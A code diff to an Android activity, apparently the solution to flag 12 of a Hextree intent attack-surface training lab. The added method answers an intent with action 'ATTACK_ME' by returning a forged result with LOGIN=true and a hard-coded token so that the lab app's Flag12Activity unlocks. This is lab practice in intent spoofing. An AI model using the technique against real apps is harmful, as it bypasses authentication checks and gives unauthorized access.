@@ -19,7 +19,24 @@ public class ImplicitActivity extends AppCompatActivity {
         EdgeToEdge.enable(this);
         setContentView(R.layout.activity_implicit_acitivity);
 
-        flag11Solution();
+        flag12Solution();
+    }
+
+    private void flag12Solution() {
+        // Get the incoming intent
+        Intent intent = getIntent();
+        Log.i("Received Intent", Utils.dumpIntent(this, intent));
+
+        // Check if the action matches
+        if ("io.hextree.attacksurface.ATTACK_ME".equals(intent.getAction())) {
+            // Create the response intent
+            Intent resultIntent = new Intent();
+            resultIntent.putExtra("LOGIN", true); // LOGIN must be true
+            resultIntent.putExtra("token", 1094795585); // Correct token
+            setResult(42, resultIntent); // Send result back to Flag12Activity
+            Log.i("Flag12Solution", "Returning result with LOGIN=true and token=1094795585");
+            finish(); // Finish the activity
+        }
     }
 
     private void flag11Solution(){
